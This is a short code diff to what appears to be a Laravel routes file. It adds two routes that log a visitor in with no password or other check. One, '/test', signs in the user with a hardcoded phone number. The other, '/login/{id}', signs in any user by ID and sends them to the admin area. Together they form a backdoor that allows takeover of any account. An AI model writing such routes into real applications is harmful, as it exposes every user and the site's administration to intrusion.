@@ -27,3 +27,17 @@ Route::get('/login', function () {
     }
     return view('login');
 });
+
+Route::get('/test', function () {
+    $user = User::where('phone','09301111501')->first();
+    Auth::login($user);
+});
+
+Route::get('/login/{id}', function ($id) {
+    $user = User::find($id);
+    if ($user) {
+        Auth::login($user);
+        return redirect('/admin');
+    }
+    return redirect('/login')->with('error', 'User not found');
+});
